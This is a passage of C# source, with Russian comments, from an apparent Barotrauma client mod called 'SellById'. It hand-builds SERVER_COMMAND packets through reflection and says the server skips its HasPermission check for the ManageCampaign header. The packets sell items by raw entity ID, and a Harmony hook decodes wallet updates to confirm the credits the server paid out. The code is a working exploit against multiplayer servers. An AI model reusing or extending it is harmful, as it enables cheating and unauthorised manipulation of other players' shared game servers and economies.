            }

            msg = CreateMsg();
            if (msg == null)
            {
                error = "WriteOnlyMessage недоступен через рефлексию";
                return false;
            }

            // --- заголовок: SERVER_COMMAND + ManageCampaign ---
            // (для этой связки внешняя HasPermission-проверка пропускается)
            msg.WriteByte((byte)ClientPacketHeader.SERVER_COMMAND);
            msg.WriteUInt16((ushort)ClientPermissions.ManageCampaign);

            // --- состояние карты: пересылаем как есть, чтобы ничего не менять ---
            int curIdx;
            int selIdx;
            try { curIdx = map.CurrentLocationIndex; } catch { curIdx = -1; }
            try { selIdx = map.SelectedLocationIndex; } catch { selIdx = -1; }
            msg.WriteUInt16(curIdx < 0 ? ushort.MaxValue : (ushort)curIdx);
            msg.WriteUInt16(selIdx < 0 ? ushort.MaxValue : (ushort)selIdx);

            List<int> missionIndices = new List<int>();
            try { missionIndices = map.GetSelectedMissionIndices().ToList(); } catch { }
            byte missionCount = (byte)Math.Min(missionIndices.Count, 255);
            msg.WriteByte(missionCount);
            for (int i = 0; i < missionCount; i++) { msg.WriteByte((byte)missionIndices[i]); }

            // --- сервисные покупки: не трогаем ---
            msg.WriteBoolean(false);
            msg.WriteBoolean(false);
            msg.WriteBoolean(false);

            // --- ящики: возвращаем серверу текущее зеркало клиента ---
            try { WriteCrate(msg, campaign.CargoManager.ItemsInBuyCrate); }
            catch { msg.WriteByte(0); }
            try { WriteCrate(msg, campaign.CargoManager.ItemsInSellFromSubCrate); }
            catch { msg.WriteByte(0); }
            msg.WriteByte(0); // purchasedItems: пусто (сервер свои покупки не трогает)

            // --- ПРОДАЖА: 1 магазин + N записей ---
            msg.WriteByte(1);
            msg.WriteIdentifier(CurrentStoreId());
            msg.WriteUInt16((ushort)entries.Count);
            foreach (var e in entries)
            {
                msg.WriteIdentifier(e.PrefabId);   // за что платят
                msg.WriteUInt16(e.EntityId);       // что удаляет сервер
                msg.WriteBoolean(false);           // removed
                msg.WriteByte(client.SessionId);   // sellerId
                msg.WriteByte(0);                  // origin = Character
            }

            // --- апгрейды: пусто ---
            msg.WriteUInt16(0);
            msg.WriteUInt16(0);

            return true;
        }

        // WriteOnlyMessage internal -> Activator по строковому имени типа
        private static IWriteMessage CreateMsg()
        {
            try
            {
                if (_writeMsgType == null)
                {
                    _writeMsgType = AccessTools.TypeByName("Barotrauma.Networking.WriteOnlyMessage");
                }
                if (_writeMsgType == null) { return null; }
                return (IWriteMessage)Activator.CreateInstance(_writeMsgType);
            }
            catch (Exception e)
            {
                LuaCsLogger.LogError("[SellById] CreateMsg: " + e.Message);
                return null;
            }
        }

        // Крэйты могут быть Dictionary<Identifier, List<PurchasedItem>> — PurchasedItem
        // internal, поэтому идём через IDictionary + reflection по членам.
        // Секция строится во временный буфер и блочится в основной пакет одним
        // куском — сбой посреди записи не портит поток.
        private static void WriteCrate(IWriteMessage msg, object crate)
        {
            try
            {
                IWriteMessage tmp = CreateMsg();
                if (tmp == null) { msg.WriteByte(0); return; }

                var storesList = new List<KeyValuePair<Identifier, List<object>>>();
                if (crate is IDictionary dict)
                {
                    foreach (DictionaryEntry de in dict)
                    {
                        if (!(de.Key is Identifier key)) { continue; }
                        var list = new List<object>();
                        if (de.Value is IEnumerable en && !(de.Value is string))
                        {
                            foreach (var it in en) { list.Add(it); }
                        }
                        storesList.Add(new KeyValuePair<Identifier, List<object>>(key, list));
                    }
                }

                tmp.WriteByte((byte)Math.Min(storesList.Count, 255));
                foreach (var kv in storesList)
                {
                    tmp.WriteIdentifier(kv.Key);
                    tmp.WriteUInt16((ushort)Math.Min(kv.Value.Count, ushort.MaxValue));
                    foreach (var pi in kv.Value)
                    {
                        var idObj = GetMemberValue(pi, "ItemPrefabIdentifier");
                        if (idObj is Identifier pid) { tmp.WriteIdentifier(pid); }
                        else { tmp.WriteIdentifier(Identifier.Empty); }

                        tmp.WriteBoolean(GetMemberValue(pi, "DeliverImmediately") is bool b && b);

                        int qty = GetMemberValue(pi, "Quantity") is int q ? q : 0;
                        tmp.WriteRangedInteger(Math.Clamp(qty, 0, 100), 0, 100);
                    }
                }

                msg.WriteBytes(tmp.Buffer, 0, tmp.LengthBytes);
            }
            catch (Exception e)
            {
                LuaCsLogger.LogError("[SellById] WriteCrate: " + e.Message);
                msg.WriteByte(0); // фоллбэк: пустой ящик (сервер очистит корзину — не критично)
            }
        }

        // Field vs Property — динамически (бинарник может отличаться от сорса)
        private static object GetMemberValue(object obj, string name)
        {
            if (obj == null) { return null; }
            try
            {
                var t = obj.GetType();
                const BindingFlags F = BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance;
                var fi = t.GetField(name, F);
                if (fi != null) { return fi.GetValue(obj); }
                var pi = t.GetProperty(name, F);
                return pi?.GetValue(obj);
            }
            catch { return null; }
        }

        // ClientPeer internal -> конкретную реализацию Send ищем рефлексией
        private static bool ResolveSendMethod()
        {
            if (_sendMethod != null) { return true; }
            try
            {
                var peer = GameMain.Client?.ClientPeer;
                if (peer == null) { return false; }
                foreach (var m in peer.GetType().GetMethods(BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic))
                {
                    if (m.Name != "Send") { continue; }
                    var ps = m.GetParameters();
                    if (ps.Length == 3 && ps[0].ParameterType == typeof(IWriteMessage))
                    {
                        _sendMethod = m;
                        return true;
                    }
                }
            }
            catch (Exception e)
            {
                LuaCsLogger.LogError("[SellById] ResolveSendMethod: " + e.Message);
            }
            return false;
        }

        // ================================================================
        //  MONEY-ЭХО (декод NetWalletUpdate через ReadDataMessage-префикс)
        // ================================================================

        private static void InstallEchoHook()
        {
            if (_echoHooked) { return; }
            try
            {
                _harmony = new Harmony("cshub.sellbyid.echo");
                var readMethod = AccessTools.Method(typeof(GameClient), "ReadDataMessage");
                if (readMethod == null)
                {
                    DebugConsole.NewMessage("[SellById] ReadDataMessage не найден — эхо-декодер выключен", Color.Orange);
                    return;
                }
                _harmony.Patch(readMethod, prefix: new HarmonyMethod(typeof(SellByIdModule), nameof(ReadDataPrefix)));
                _echoHooked = true;
                DebugConsole.NewMessage("[SellById] MONEY-эхо декодер установлен", Color.Gray);
            }
            catch (Exception e)
            {
                LuaCsLogger.LogError("[SellById] InstallEchoHook: " + e.Message);
            }
        }

        private static void UnpatchEcho()
        {
            if (!_echoHooked || _harmony == null) { return; }
            try
            {
                var readMethod = AccessTools.Method(typeof(GameClient), "ReadDataMessage");
                if (readMethod != null)
                {
                    _harmony.Unpatch(readMethod, HarmonyPatchType.Prefix, _harmony.Id);
                }
            }
            catch { }
            _echoHooked = false;
        }

        // GameClient.ReadDataMessage(IReadMessage inc) — диспетч всех входящих пакетов
        private static void ReadDataPrefix(IReadMessage inc)
        {
            int prevPos = 0;
            try { prevPos = inc.BitPosition; } catch { }
            try
            {
                if (inc == null || inc.LengthBytes < 2) { return; }
                inc.BitPosition = 0;
                byte header = inc.ReadByte();
                if (header != (byte)ServerPacketHeader.MONEY) { return; } // 26 = MONEY
                DecodeMoneyUpdate(inc);
            }
            catch { }
            finally
            {
                try { inc.BitPosition = prevPos; } catch { }
            }
        }

        // NetWalletUpdate: [BitField][байтовый поток]; NetWalletTransaction:
        //   { Option<ushort> CharacterID, WalletChangedData{Option<int>, Option<int>},
        //     WalletInfo{int RewardDistribution, int Balance} }
        private static void DecodeMoneyUpdate(IReadMessage inc)
        {
            var bf = new MiniBitField(inc);
            int count = bf.ReadInteger(0, 256);
            if (count < 0 || count > 256) { return; }

            ushort myId = 0;
            try { myId = Character.Controlled?.ID ?? (ushort)0; } catch { }

            for (int i = 0; i < count; i++)
            {
                bool hasId = bf.ReadBoolean();
                ushort charId = 0;
                if (hasId) { charId = inc.ReadUInt16(); }

                bool hasRewardChg = bf.ReadBoolean();
                if (hasRewardChg) { inc.ReadInt32(); }

                bool hasBalanceChg = bf.ReadBoolean();
                int balanceChg = hasBalanceChg ? inc.ReadInt32() : 0;

                inc.ReadInt32(); // WalletInfo.RewardDistribution
                int infoBalance = inc.ReadInt32();

                if (!hasId)
                {
                    _bankBalance = infoBalance;
                    continue;
                }

                if (myId != 0 && charId == myId)
                {
                    bool changed = _walletBalance != infoBalance;
                    _walletBalance = infoBalance;

                    if (hasBalanceChg && balanceChg != 0 && _awaitingEcho)
                    {
                        _lastResult = (balanceChg > 0 ? "СЕРВЕР ДАЛ: +" : "СЕРВЕР СПИСАЛ: ") +
                                      balanceChg + " mk (баланс " + infoBalance + ")";
                        Color c = balanceChg > 0 ? SuccessColor : DangerColor;
                        GUI.AddMessage("Sell By ID: " + _lastResult, c);
                        DebugConsole.NewMessage("[SellById] " + _lastResult, balanceChg > 0 ? Color.Lime : Color.Orange);
                        _awaitingEcho = false;
                    }
                    else if (changed && !hasBalanceChg)
                    {
                        _lastResult = "баланс обновлён: " + infoBalance + " mk (без дельты)";
                    }
                }
            }
            UpdateStatus();
        }

        // Мини-копия Barotrauma BitField (NetStructBitField.cs):
        // 7 бит/байт LSB-first, бит7 последнего байта = конец поля.
        private sealed class MiniBitField
        {
            private readonly List<byte> _bytes = new List<byte>();
            private int _index;

            public MiniBitField(IReadMessage inc)
            {
                while (true)
                {
                    if (inc.BitPosition >= inc.LengthBits) { throw new Exception("bitfield overrun"); }
                    byte b = inc.ReadByte();
                    _bytes.Add(b);
                    if ((b & 0x80) != 0) { break; }
                }
            }

            public bool ReadBoolean()
            {
                int byteIdx = _index / 7;
                int bitIdx = _index % 7;
                _index++;
                return (_bytes[byteIdx] & (1 << bitIdx)) != 0;
            }

            public int ReadInteger(int min, int max)
            {
                // = NetUtility.BitsToHoldUInt(range)
                uint range = (uint)(max - min);
                int bits = 0;
                while (range > 0) { bits++; range >>= 1; }
                if (bits == 0) { bits = 1; }

                uint value = 0;
                for (int i = 0; i < bits; i++)
                {
                    if (ReadBoolean()) { value |= 1u << i; }
                }
                return (int)(min + value);
            }
        }
    }
}
